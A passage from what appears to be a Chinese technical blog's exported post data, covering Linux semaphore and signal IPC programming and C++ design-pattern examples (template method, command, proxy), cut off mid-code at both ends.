(%d)\\n&quot;, getpid(), i); sem_v(sem_even); &#125; sem_p(sem_even); // sleep(DELAY_TIME); waitpid(pid, NULL, 0); del_sem(sem_even); printf(&quot;prograss even[%d] quit..\\n&quot;, getpid()); exit(0);&#125;int init_sem(int sem_id, int init_val)&#123; union semun sem_union; sem_union.val = init_val; if(semctl(sem_id, 0, SETVAL, sem_union) == -1) &#123; perror(&quot;init semaphore error.\\n&quot;); return -1; &#125; return 0;&#125;int del_sem(int sem_id)&#123; union semun sem_union; if(semctl(sem_id, 0, IPC_RMID, sem_union) == -1) &#123; // perror(&quot;Delete semaphore error.\\n&quot;); return -1; &#125; return 0;&#125;int sem_p(int sem_id)&#123; struct sembuf sem_b; sem_b.sem_num = 0; sem_b.sem_op = -1; sem_b.sem_flg = SEM_UNDO; if(semop(sem_id, &amp;sem_b, 1) == -1) &#123; perror(&quot;P error.\\n&quot;); return -1; &#125; return 0;&#125;int sem_v(int sem_id)&#123; struct sembuf sem_b; sem_b.sem_num = 0; sem_b.sem_op = 1; sem_b.sem_flg = SEM_UNDO; if(semop(sem_id, &amp;sem_b, 1) == -1) &#123; perror(&quot;P error.\\n&quot;); return -1; &#125; return 0;&#125; 然后继续新建代码文件 odd_demo.c ，这是用于输出奇数消息的程序，如下图所示： 然后添加如下代码内容： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110/* 该程序将仅输出奇数值，配合 even_demo 程序完成 0 - 20 的计数输出*/#include &lt;sys/types.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/sem.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define DELAY_TIME 3union semun&#123; int val; struct semid_ds *buf; unsigned short *array;&#125;;//信号量初始化int init_sem(int sem_id, int init_value);//从系统中删除信号量int del_sem(int sem_id);//P操作int sem_p(int sem_id);//V操作int sem_v(int sem_id);//定义ftok参数#define SEM_ODD_KEY &quot;./odd_dem_key&quot;#define SEM_EVEN_KEY &quot;./even_dem_key&quot;int main()&#123; pid_t pid; int sem_odd, sem_even; //创建一个信号量 sem_odd = semget(ftok(SEM_ODD_KEY, &#x27;a&#x27;), 1, 0666|IPC_CREAT); sem_even = semget(ftok(SEM_EVEN_KEY, &#x27;a&#x27;), 1, 0666); init_sem(sem_odd, 0); sem_v(sem_odd); for(int i = 1; i &lt; 20; i = i + 2) &#123; sem_p(sem_even); //获取偶数信号量 printf(&quot;[%d]====&gt; (%d)\\n&quot;, getpid(), i); sem_v(sem_odd); &#125; sleep(DELAY_TIME); del_sem(sem_odd); printf(&quot;prograss odd[%d] quit..\\n&quot;, getpid()); return 0;&#125;int init_sem(int sem_id, int init_val)&#123; union semun sem_union; sem_union.val = init_val; if(semctl(sem_id, 0, SETVAL, sem_union) == -1) &#123; perror(&quot;init semaphore error.\\n&quot;); return -1; &#125; return 0;&#125;int del_sem(int sem_id)&#123; union semun sem_union; if(semctl(sem_id, 0, IPC_RMID, sem_union) == -1) &#123; perror(&quot;Delete semaphore error.\\n&quot;); return -1; &#125; return 0;&#125;int sem_p(int sem_id)&#123; struct sembuf sem_b; sem_b.sem_num = 0; sem_b.sem_op = -1; sem_b.sem_flg = SEM_UNDO; if(semop(sem_id, &amp;sem_b, 1) == -1) &#123; perror(&quot;P error.\\n&quot;); return -1; &#125; return 0;&#125;int sem_v(int sem_id)&#123; struct sembuf sem_b; sem_b.sem_num = 0; sem_b.sem_op = 1; sem_b.sem_flg = SEM_UNDO; if(semop(sem_id, &amp;sem_b, 1) == -1) &#123; perror(&quot;P error.\\n&quot;); return -1; &#125; return 0;&#125; 在 VS Code 平台下的终端窗口使用 gcc 编译代码并执行，如下图所示： 123gcc odd_demo.c -o odd_demogcc even_demo.c -o even_demo./even_demo # 由于 odd_demo 程序在 eve_demo 中采用 execl 方式执行，所以不需要手动执行 odd_demo ，仅执行 even_demo 即可（从偶数 0 开始计数） 从上图中可以看到，两个进程之间交替进行，顺序很有规律，表示我们使用信号量的控制是有效的，在后面的共享内存通信中也会用到信号量作为进程之间的同步机制，所以这一章希望大家好好学习理解和掌握。","tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"},{"name":"Linux操作系统原理剖析","slug":"A-OS/Linux/Linux操作系统原理剖析","permalink":"http://example.com/categories/A-OS/Linux/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90/"}]},{"title":"【原理剖析】5-进程间通信方式之信号通信","date":"2023-12-25T16:00:00.000Z","path":"A_OS/Linux/Linux操作系统原理剖析/5-进程间通信方式之信号通信/","text":"概述：知识点 Linux 信号概述 Linux 信号通信原理 Linux 信号相关 API 函数介绍 0x01 Linux信号概述信号机制是一种使用信号来进行进程之间传递消息的方法，信号的全称为软中断信号，简称软中断。关于 Linux 信号的特点可以概括如下几点： 信号是在软件层次上对中断机制的一种模拟。在原理上，一个进程收到一个信号与处理器收到一个中断请求可以说是一样的。 信号是异步的，一个进程不必通过任何操作来等待信号的到达，事实上进程也不知道信号到底什么时候到达。 信号可以直接进行用户空间进程和内核进程之间的交互，内核进程也可以利用它来通知用户空间进程发生了哪些系统事件。它可以在任何时候发给某一个进程，而无需知道该进程的状态。如果该信号当前并未处于执行态(Running),则该信号由内核保存起来，直到该进程恢复执行再传递给它为止。如果一个信号被进程设置为阻塞，则该信号的传递被延迟，直到其阻塞被取消时才被传递给进程。 信号是进程间通信机制中唯一的异步通信机制，可以看作是异步通知，通知接收信号的进程有哪些事件发生了。信号机制除了基本通知外，还可以传递附加信息。 在 Linux 系统内核头文件 signal.h 中定义有 64 种信号，这些信号都是以 SIG 开头，且都被定义为正整数。除了通过查看 signal.h 头文件能够看到信号的名字和定义外，还可以在 Linux 系统下使用命令 kill -l 来查看信号的名字以及序号，信号都是从 1 开始编号的，不存子 0 号信号。具体如下图所示(由于实验环境采用虚拟容器，所以执行 kill -l 并不会有结果显示)： 0x02 Linux信号通信原理要搞清楚信号通信的原理，就需要搞清楚信号的产生、传输以及响应。 信号时间产生其实就是信号的来源，对于 Linux 操作系统来说信号的主要来源可以归纳为以下两点： 硬件来源。如我们按下了键盘上的按钮 或者出现其他硬件故障； 软件来源。最常用发送信号的系统函数有 kill()、raise()、alarm()、setitimer() 和 sigqueue()等，软件来源还包括一些非法运算等操作。 而对于信号在产生之后，Linux 对每个信号都有一个缺省的动作，典型的缺省动作就是终止进程，当这个信号的进程收到信号后会根据这个信号的具体情况提供以下三种不同的处理方式： 忽略信号。忽略信号即对信号不做处理，其中，有两个信号不能忽略：SIGKILL 和 SIGSTOP。 捕捉信号。定义信号处理函数，当信号发生时，执行响应的处理函数。 执行默认操作。Linux 对每种信号都规定了默认操作。 对应部分系统定义的信号，Linux 系统都规定了一些默认操作作为信号的响应处理，如下图所示： 一个完整的信号生命周期可以分为 3 个重要阶段，这 3 个阶段由 4 个重要事件来刻画的；信号产生、信号在进程中注册、信号在进程中注销、执行信号处理函数。这里信号的产生、注册、注销等是指信号的内部实现机制，而不是信号的函数实现(不受我们的掌控)。因此信号注册与否与后面讲到的发送信号函数（如 kill() 等）及信号安装函数（如 signal() 等）无关，只与信号值有关。 相邻两个事件的时间间隔构成信号生命周期的一个阶段，如下图.注意这里的信号处理有多种方式，一般是由内核完成的，当然也可以由用户进程来完成。如下图所示： 信号的处理包括信号的发送、捕捉和处理，它们有各自相对应的常见函数： 发生信号的函数: kill()、raise() 捕捉信号的函数: alarm()、pause() 处理信号的函数: signal()、sigaction() 0x03 Linux 信号相关 API 函数介绍前面其实已经提到了很多 Linux 信号机制相关的函数。下面就分别镜像讲解和介绍。 kill() 函数同咱们的 kill 系统命令一样（但不能真的认为 kill() 就是 kill），可以发送信号给进程或进程组（实际上，kill 系统命令只是 kill() 函数的一个用户接口）。这里需要注意的是，kill() 函数不仅可以终止进程（实际上是通过发出 SIGKILL 信号终止），也可以向进程发送其他信号。具体描述如下： 1234567891011121314#include &lt;signal.h&gt;#include &lt;sys/types.h&gt;int kill(pid_t pid, int sig);/*参数： - pid：要发送信号的进程号 0 信号被发送给所有和当前进程在同一进程组的进程号 -1 信号发给所有的进程表中的进程（除了进程号最大的进程之外） &lt;-1 信号发送给进程组好为 -pid 的每一个进程 - sig：信号返回值 成功：0 失败：-1*/ 与 kill() 函数不同的是，raise() 函数允许进程向自身发送信号。具体描述如下： 12345678910#include &lt;signal.h&gt;#include &lt;sys/types.h&gt;int raise(int sig);/*参数 - sig：信号返回值 成功：0 失败：-1*/ 除了上面的信号发送函数，Linux 还定义了两个信号捕捉函数用来接收信号 alarm() 和 pause() 。 alarm() 也称为闹钟函数，它可以在进程中设置一个定时器，当定时器指定的时间到时，它就向进程发送 SIGALARM 信号。要注意的是，一个进程只能有一个闹钟时间，如果在调用 alarm() 之前已设置过闹钟时间，则任何以前的闹钟时间都被新值所代替。具体描述如下： 12345678910#include &lt;unistd.h&gt;unsigned int alarm(unsigned int seconds)/*参数 seconds：指定秒数，系统经过 seconds 后会向该进程发送 SIGALRM 信号返回值 成功：如果调用此 alarm() 前已经设置好闹钟时间，则返回上一个闹钟剩余时间，否则返回 0 失败：-1*/ pause() 函数用于将调用进程挂起直至捕捉到信号为止。这个函数很常用，通常可以用于判断信号是否已到。具体描述如下： 1234567#include &lt;unistd.h&gt;int pause(void)/*返回值 出错返回 -1，并设置 errno*/ Linux 信号处理的方法主要有以下两种： 使用 signal() 函数 使用信号集函数组 使用 signal() 函数处理时，只需指出要处理的信号和处理函数即可。它主要用于前 32 种非实时信号的处理，不支持信号传递信息。Linux 还支持一个更健壮更新的信号处理函数呢，它就是 sigaction()，Unix 环境编程等书籍其实都是推荐使用这个函数。具体函数介绍如下： 12345678910111213141516171819202122232425262728293031#include &lt;signal.h&gt;typedef void (*sighandler_t)(int);sighandle_t signal(int signum, sighandler_t handler);/*参数： signum：指定信号代码 handler：SIG_IGN - 忽略该信号 SIG_DFL - 采用系统默认方式处理信号 自定义的信号处理函数指针返回值： 成功：之前的信号处理配置 失败；-1*/#include &lt;signal.h&gt;struct sigaction&#123; void (*sa_handler)(int signo); //函数指针，指定信号处理函数，可以是 SIG_DFL（默认处理方式）和 SIG_IGN（忽略信号） sigset_t sa_mask; //信号集，指定在处理中屏蔽哪些信号 int sa_flags; //信号标志位，包含对信号处理的各个选择项 void (*sa_restore)(void);&#125;;int sigaction(int signum, const struct sigaction *act, struct sigaction *oldact);/*参数： signum 信号代码，可以是除了 SIGKILL SIGSTOP 之外的任何一个特定有效的信号 act 执行结构体 sigaction 的一个实例指针，指定对特定信号的处理 oldact 保存原来对相应信号的处理返回值： 成功：0 失败：-1*/ 使用信号集函数组处理信号时设计一系列的函数，这些函数按照先后的调用次序可分为以下几大模块：创建信号集、注册信号处理函数及检测信号。 其中，创建信号集主要用于处理用户感兴趣的一些信号，其函数包括以下几个： sigemptyset(): 将信号集初始化为空 sigfillset(): 将信号集初始化为包含所有已定义的信号集 sigaddset(): 将指定信号加入到信号集中 sigdelset(): 将指定信号从信号集中删除 sigismember(): 查询指定信号是否在信号集中 注册信号处理函数主要用于决定进程如何处理信号。这里要注意的是，信号集里的信号并不是真正可以处理的信号，只有当信号的状态处于非阻塞状态时才会真正起作用。因此，首先使用 sigprocmask() 函数检测并更改信号屏蔽字（信号屏蔽字是用来指定当前被阻塞的一组信号，它们不会被进程接收），然后使用 sigaction() 函数来定义进程接收到特定信号后的行为。 检测信号是信号处理的后续步骤，因为被阻塞的信号不会传递给进程，所以这些信号就处于“未处理”状态（也就是进程不清除它的存在）。sigaction() 函数允许进程检测“未处理”信号，并进一步决定对它们做何处理。 具体描述如下： 1234567891011121314#include &lt;signal.h&gt;int sigemptyset(sigset_t *set);int sigfillset(sigset_t *set);int sigaddset(sigset_t *set, int signum);int sigdelset(sigset_t *set, int signum);int sigismember(sigset_t *set, int signum);/*参数： set：信号集 signum：信号代码返回值： 成功：0 失败：-1*/ 在 sigprocmask() 中，若 set 是一个非空指针，则参数 how 表示函数的操作方式；若 how 为空，则表示忽略此操作。 1234567891011121314151617181920212223#include &lt;signal.h&gt;int sigprocmask(int how, const sigset_t *set, sigset_t *oset);/*参数： how： SIG_BLOCK 增加一个信号集到当前进程的阻塞集中 SIG_UNBLOCK 从当前的阻塞集中删除一个信号集 SIG_SETMASK 将当前的信号集设置为信号阻塞集 set：指定信号集 oset：信号屏蔽字返回值： 成功：0 失败：-1*/#include &lt;signal.h&gt;int sigpending(sigset_t *set);/*参数： set：要检测的信号集返回值： 成功：0 失败：-1*/ 处理信号总是遵循下图所示的过程：","tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"},{"name":"Linux操作系统原理剖析","slug":"A-OS/Linux/Linux操作系统原理剖析","permalink":"http://example.com/categories/A-OS/Linux/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90/"}]},{"title":"设计模式","date":"2023-12-25T01:28:27.249Z","path":"A_内功/B_设计模式/设计模式/","text":"除了“设计模式”，你还应该知道什么程序员内功之设计模式🔥 推荐学习视频C++常用设计模式 设计模式从何而来四人组（Gang of Four)，简称GoF. GoF将模式的概念引入软件工程领域，这标志着软件模式的诞生。软件模式（Software Pattern是）是将模式的一半概念应用于软件开发领域，即软件开发的总体指导思路或参照样板. 需要了解软件模式并非仅限于设计模式，还包括架构模式、分析模式和过程模式等。 “软件设计模式(Design Pattern)是一套被反复使用、多数人知晓的、经过分类编目的、代码设计经验的总结，使用设计模式是为了可充用代码，让代码更容易被他人理解并且保证代码可靠性。” ——软件设计模式的定义 一句大白话就是：“在一定环境下，用固定套路解决问题”。 软件设计模式的种类GoF提出的设计模式有23个，包括： 设计模式之创建型模式(Creational)：如何创建对象; 创建型模式的主要关注点是“怎样创建对象？”，它的主要特点是“将对象的创建与使用分离”。这样可以降低系统的耦合度，使用者不需要关注对象的创建细节，对象的创建由相关的工厂来完成。就像我们去商场购买商品时，不需要知道商品是怎么生产出来一样，因为它们由专门的厂商生产。 单例（Singleton）模式：某个类只能生成一个实例，该类提供了一个全局访问点供外部获取该实例，其拓展是有限多例模式。 原型（Prototype）模式：将一个对象作为原型，通过对其进行复制而克隆出多个和原型类似的新实例。 工厂方法（FactoryMethod）模式：定义一个用于创建产品的接口，由子类决定生产什么产品。 抽象工厂（AbstractFactory）模式：提供一个创建产品族的接口，其每个子类可以生产一系列相关的产品。 建造者（Builder）模式：将一个复杂对象分解成多个相对简单的部分，然后根据不同需要分别创建它们，最后构建成该复杂对象。 设计模式之结构型模式(Structional)：如何实现类或对象的组合； 结构型模式描述如何将类或对象按某种布局组成更大的结构。它分为类结构型模式和对象结构型模式，前者采用继承机制来组织接口和类，后者釆用组合或聚合来组合对象。 由于组合关系或聚合关系比继承关系耦合度低，满足“合成复用原则”，所以对象结构型模式比类结构型模式具有更大的灵活性。 结构型模式分为以下 7 种： 代理（Proxy）模式：为某对象提供一种代理以控制对该对象的访问。即客户端通过代理间接地访问该对象，从而限制、增强或修改该对象的一些特性。 适配器（Adapter）模式：将一个类的接口转换成客户希望的另外一个接口，使得原本由于接口不兼容而不能一起工作的那些类能一起工作。 桥接（Bridge）模式：将抽象与实现分离，使它们可以独立变化。它是用组合关系代替继承关系来实现的，从而降低了抽象和实现这两个可变维度的耦合度。 装饰（Decorator）模式：动态地给对象增加一些职责，即增加其额外的功能。 外观（Facade）模式：为多个复杂的子系统提供一个一致的接口，使这些子系统更加容易被访问。 享元（Flyweight）模式：运用共享技术来有效地支持大量细粒度对象的复用。 组合（Composite）模式：将对象组合成树状层次结构，使用户对单个对象和组合对象具有一致的访问性。 设计模式之行为型模式(Behavioral)：类或对象怎样交互以及怎么分配职责。 行为型模式用于描述程序在运行时复杂的流程控制，即描述多个类或对象之间怎样相互协作共同完成单个对象都无法单独完成的任务，它涉及算法与对象间职责的分配。 行为型模式分为类行为模式和对象行为模式，前者采用继承机制来在类间分派行为，后者采用组合或聚合在对象间分配行为。由于组合关系或聚合关系比继承关系耦合度低，满足“合成复用原则”，所以对象行为模式比类行为模式具有更大的灵活性。 行为型模式是 GoF 设计模式中最为庞大的一类，它包含以下 11 种模式。 模板方法（Template Method）模式：定义一个操作中的算法骨架，将算法的一些步骤延迟到子类中，使得子类在可以不改变该算法结构的情况下重定义该算法的某些特定步骤。 策略（Strategy）模式：定义了一系列算法，并将每个算法封装起来，使它们可以相互替换，且算法的改变不会影响使用算法的客户。 命令（Command）模式：将一个请求封装为一个对象，使发出请求的责任和执行请求的责任分割开。 职责链（Chain of Responsibility）模式：把请求从链中的一个对象传到下一个对象，直到请求被响应为止。通过这种方式去除对象之间的耦合。 状态（State）模式：允许一个对象在其内部状态发生改变时改变其行为能力。 观察者（Observer）模式：多个对象间存在一对多关系，当一个对象发生改变时，把这种改变通知给其他多个对象，从而影响其他对象的行为。 中介者（Mediator）模式：定义一个中介对象来简化原有对象之间的交互关系，降低系统中对象间的耦合度，使原有对象之间不必相互了解。 迭代器（Iterator）模式：提供一种方法来顺序访问聚合对象中的一系列数据，而不暴露聚合对象的内部表示。 访问者（Visitor）模式：在不改变集合元素的前提下，为一个集合中的每个元素提供多种访问方式，即每个元素有多个访问者对象访问。 备忘录（Memento）模式：在不破坏封装性的前提下，获取并保存一个对象的内部状态，以便以后恢复它。 解释器（Interpreter）模式：提供如何定义语言的文法，以及对语言句子的解释方法，即解释器。 以上 11 种行为型模式，除了模板方法模式和解释器模式是类行为型模式，其他的全部属于对象行为型模式。 设计模式目前的种类：GoF的23种 +“简答工厂模式” = 24种 软件设计模式有什么用？有助于更加深入地理解面向对象思想，让你知道： 1. 如何将代码分散在几个不同的类中 2. 为什么要有“接口” 3. 何为针对抽象编程 4. 合适不应该使用继承 5. 如何不修改源代码增加新功能 6. 更好地阅读和理解现有类库与其他系统中的源代码 如何学好设计模式设计模式的基础是：多态，参考书上给的建议就是： 初学者：积累案例，不要盲目的背类图（我就是） 初级开发人员：多思考，多梳理，归纳总结，尊重事物的认知规律，注意临界点的突破，不要浮躁。 中级开发人员：合适的开发环境，寻找合适的设计模式来解决问题。多应用，对经典的组合设计模式，大量自由的运用，要不断地追求。 关于语言语言是基础，学习设计模式之前一定要对自己现在使用和运用的语言加以了解；熟悉、掌握多态。 C++学习者建议可以读一遍《c++ Primer Plus》，尤其是面向对象部分 设计模式总览创建型模式（Creational） 结构型模式(Structural) 行为型模式（Behavioral） 面向对象设计原则 名称 定义 单一职责原则（Single Responsibility Principle,SRP)⭐️⭐️⭐️⭐️ 类的职责单一，对外只提供一种可能，而引起类变化的原因都应该只有一个。 开闭原则（Open-Closed Principle,OCP)⭐️⭐️⭐️⭐️⭐️ 类的改动是通过增加代码进行的，而不是修改源代码 里氏代换原则(Liskov Substitution Principle,LSP)⭐️⭐️⭐️⭐️⭐️ 任何抽象类出现的地方都可以用他的实现类进行替换，实际就是虚拟机制，语言级别实现面向对象功能。 依赖倒转原则（Dependence Inversion Priciple,DIP)⭐️⭐️⭐️⭐️⭐️ 依赖于抽象（接口），不要依赖具体的实现（类），也就是针对接口编程。 接口隔离原则（Interface Segregation Principle,ISP)⭐️⭐️ 不应该强迫用户的程序依赖他们不需要的接口方法。一个接口只提供一种对外功能，不应该把所有操作都封装到一个接口中去。 合成复用原则（Composite Reuse Principle，CRP)⭐️⭐️⭐️⭐️ 如果使用继承，会导致父类的任何变化都可能影响到子类的行为，如果使用对象组合，就降低了这种依赖关系，对于继承和类，优先使用该组合。 迪米特法则（Law of Demeter,LoD)⭐️⭐️⭐️ 一个对象应当对其他对象尽可能少的了解,从而降低各个对象之间的耦合,提高系统的可维护性。例如在一个程序中,各个模块之间相互调用时,通常会提供- -个统- -的接口来实现。这样其他模块不需要了解另外一个模块的内部实现细节, 这样当一个模块内部的实现发生改变时,不会影响其他模块的使用。( 黑盒原理) 借鉴了《Easy搞定设计模式》","tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"设计模式","slug":"设计模式","permalink":"http://example.com/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"创建型模式","slug":"创建型模式","permalink":"http://example.com/tags/%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/"}],"categories":[{"name":"A_内功","slug":"A-内功","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/"},{"name":"B_设计模式","slug":"A-内功/B-设计模式","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/B-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}]},{"title":"设计模式之行为型模式","date":"2023-12-25T01:28:27.247Z","path":"A_内功/B_设计模式/行为型模式/","text":"行为型模式 学习笔记之C++设计模式——创建型模式 📑 设计模式之结构型模式 📑 设计模式之创建型模式 总的来说，行为型模式就是用来对类或对象怎样交互和怎样分配职责进行描述。 模板方法模式 AbstractClass（抽象类）：在抽象类中定义了一系列基本操作（PrimitiveOperations），这些基本操作可以是具体的，也可以是抽象的，每一个基本操作对应算法的一个步骤，在其子类中可以重定义或实现这些步骤。同时，在抽象类中实现了一个模板方法（Template Method），用于定义一个算法的框架，模板方法不仅可以调用在抽象类中实现的基本方法，也可以调用在抽象类的子类中实现的基本方法，还可以调用其他对象中的方法。 ConcreteClass（具体子类）：它是抽象类的子类，用于是现在父类中声明的抽象基本操作以完成子类特定算法的步骤，也可以覆盖在父类中的已经实现的具体基本操作。 模板方法案例 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485// 模板方法.cpp : 定义控制台应用程序的入口点。//#include &quot;stdafx.h&quot;#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;// 制作饮料class Beverage&#123;public: // 煮水 void BoilWater() &#123; cout &lt;&lt; &quot;烧开水&quot; &lt;&lt; endl; &#125; // 冲泡 特殊接口 virtual void Brew() = 0; // 倒入杯中 void PourinVup() &#123; cout &lt;&lt; &quot;倒入杯中&quot; &lt;&lt; endl; &#125; // 添加料 特殊接口 virtual void AddCondiments() = 0; // hook 方法，决定某些算法步骤是否挂钩在算法中 virtual bool CustomWantsCondiments() &#123; return true; &#125; // 模板方法 void PrepareBeverage() &#123; BoilWater(); Brew(); PourinVup(); if (CustomWantsCondiments()) &#123; AddCondiments(); &#125; &#125;protected: private:&#125;;class Coffee : public Beverage&#123;public: virtual void Brew() &#123; cout &lt;&lt; &quot;冲泡咖啡豆&quot; &lt;&lt; endl; &#125; virtual void AddCondiments() &#123; cout &lt;&lt; &quot;添加糖和牛奶&quot; &lt;&lt; endl; &#125;protected:private:&#125;;class Tea : public Beverage&#123;public: virtual void Brew() &#123; cout &lt;&lt; &quot;冲泡茶叶&quot; &lt;&lt; endl; &#125; virtual void AddCondiments() &#123; cout &lt;&lt; &quot;添加柠檬&quot; &lt;&lt; endl; &#125;protected:private:&#125;;int main()&#123; Beverage *pTea = new Tea; pTea-&gt;PrepareBeverage(); delete pTea; cout &lt;&lt; &quot;-----------------------&quot; &lt;&lt; endl; Beverage *pCoffee = new Tea; pCoffee-&gt;PrepareBeverage(); delete pCoffee; return 0;&#125; 输出： 烧开水 冲泡茶叶 倒入杯中 添加柠檬 ----------------------- 烧开水 冲泡茶叶 倒入杯中 添加柠檬 请按任意键继续. . . ## 模板方法的优缺点 在父类中形式化地定义一个算法，而由它的子类来实现细节的处理，在子类实现详细的处理算法时并不会改变算法中步骤的执行次序。 模板方法模式是一种代码复用技术，它在类库设计中尤为重要，它提取了类库中的公共行为，将公共行为放在父类中，而通过其子类来实现不同的行为，它鼓励我们恰当使用继承来实现代码复用。 可实现一种反向控制结构，通过子类覆盖父类的钩子方法来决定某一特定步骤是否需要执行。 在模板方法模式中可以通过子类来覆盖父类的基本方法，不同的子类可以提供基本方法的不同实现，更换和增加新的子类很方便，符合单一职责原则和开闭原则 需要为每一个基本方法的不同实现提供一个子类，如果父类中可变的基本方法太多，将会导致类的个数增加，系统更加庞大，设计也更加抽象。 适用场景 具有统一的操作步骤或操作过程； 具有不同的操作细节； 存在多个具有同样操作步骤的应用场景，但某些具体的操作细节却各不相同 在抽象类中统一操作步骤，并规定好接口；让子类实现接口。这样可以吧各个具体的子类和操作步骤解耦合。 命令模式将一个请求封装为一个对象，从而让我们可用不同的请求对客户进行参数化；对请求排队或者记录请求日志，以及支持可撤销的操作。命令模式是一种对象行为模式，其别名为动作(Action)模式或事务（Tranaction）模式。 命令模式可以将请求发送者和接收者完全解耦，发送者与接收者之间没有直接引用关系，发送请求的对象只需要知道如何发送请求，而不必知道如何完成请求。 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273// 命令模式.cpp : 定义控制台应用程序的入口点。//#include &quot;stdafx.h&quot;#include &lt;iostream&gt;using namespace std;class Doctor&#123;public: void treat_eye() &#123; cout &lt;&lt; &quot;医生 治疗 眼科病&quot; &lt;&lt; endl; &#125; void treat_nose() &#123; cout &lt;&lt; &quot;医生 治疗 鼻科病&quot; &lt;&lt; endl; &#125;protected:private:&#125;;class CommandTreatEye &#123;public: CommandTreatEye(Doctor *doctor) &#123; m_doctor = doctor; &#125; void treat() &#123; m_doctor-&gt;treat_eye(); &#125;private: Doctor *m_doctor;&#125;;class CommandTreatNose &#123;public: CommandTreatNose(Doctor *doctor) &#123; m_doctor = doctor; &#125; void treat() &#123; m_doctor-&gt;treat_nose(); &#125;private: Doctor *m_doctor;&#125;;int main()&#123; // 1. 医生直接看病 Doctor *doctor = new Doctor; doctor-&gt;treat_eye(); delete doctor; cout &lt;&lt; &quot;-----------------&quot; &lt;&lt; endl; // 2. 通过医疗指令来看病 Doctor *doctorCmd = new Doctor; CommandTreatEye * cmdEyeDoc = new CommandTreatEye(doctorCmd); cmdEyeDoc-&gt;treat(); delete cmdEyeDoc; CommandTreatNose *cmdNoseDoc = new CommandTreatNose(doctorCmd); cmdNoseDoc-&gt;treat(); delete cmdNoseDoc; delete doctorCmd; return 0;&#125; 输出： 医生 治疗 眼科病 ----------------- 医生 治疗 眼科病 医生 治疗 鼻科病 请按任意键继续. . . > 命令模式的本质是对请求进行封装对应于一个命令，将发出命令的责任和执行命令的责任分割开。 命令模式中的角色和职责 策略模式 观察者模式","tags":[{"name":"设计模式","slug":"设计模式","permalink":"http://example.com/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"categories":[{"name":"A_内功","slug":"A-内功","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/"},{"name":"B_设计模式","slug":"A-内功/B-设计模式","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/B-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}]},{"title":"设计模式之结构型模式","date":"2023-12-25T01:28:27.245Z","path":"A_内功/B_设计模式/结构型模式/","text":"结构型模式 学习笔记之C++设计模式——创建型模式 📑 设计模式之创建型模式 📑 设计模式之行为型模式 Proxy模式又叫做代理模式，是构造型的设计模式之一， 它可以为其他对象提供-种代理( Proxy )以控制对这个对象的访问。所谓代理，是指具有与代理元(被代理的对象)具有相同的接口的类，客户端必须通过代理与被代理的目标类交互，而代理一-般在交互的过程中 (交互前后) , 进行某些特别的处理。 代理模式 通俗理解就和海外代购类似，由一个海外代购专门负责所有需要从其他国家购买的这个行为。 以下为代理模式案例及其代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102// 代理模式.cpp : 定义控制台应用程序的入口点。//#include &quot;stdafx.h&quot;#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;class Item&#123;public: Item(string kind, bool fact) &#123; this-&gt;kind = kind; this-&gt;fact = fact; &#125; string getKind() &#123; return kind; &#125; bool getFact() &#123; return fact; &#125;protected:private: string kind; bool fact;&#125;;// 抽象的购物方式class Shopping&#123;public: virtual void buy(Item *it) = 0;protected:private:&#125;;class KoeraShopping : public Shopping&#123;public: void buy(Item *it) &#123; cout &lt;&lt; &quot;去韩国买了&quot; &lt;&lt; it-&gt;getKind() &lt;&lt; endl; &#125;protected:private:&#125;;class USAShopping : public Shopping&#123;public: void buy(Item * it) &#123; cout &lt;&lt; &quot;去美国买了&quot; &lt;&lt; it-&gt;getKind() &lt;&lt; endl; &#125;protected:private:&#125;;// 海外代理class OverseasProxy : public Shopping&#123;public: OverseasProxy(Shopping *shopping) &#123; this-&gt;shopping = shopping; &#125; virtual void buy(Item *it) &#123; if (it-&gt;getFact() == true) &#123; cout &lt;&lt; &quot;发现正品&quot; &lt;&lt; endl; shopping-&gt;buy(it); cout &lt;&lt; &quot;---------安检-----------&quot; &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; &quot;发现假货&quot; &lt;&lt; it-&gt;getKind() &lt;&lt; endl; &#125; &#125;protected:private: Shopping *shopping; // 有一个购物方式&#125;;int main()&#123; Item it1(&quot;nike鞋子&quot;, true); Item it2(&quot;CET4证书&quot;, false); Shopping *Koerashopping = new KoeraShopping; Shopping *usaShopping = 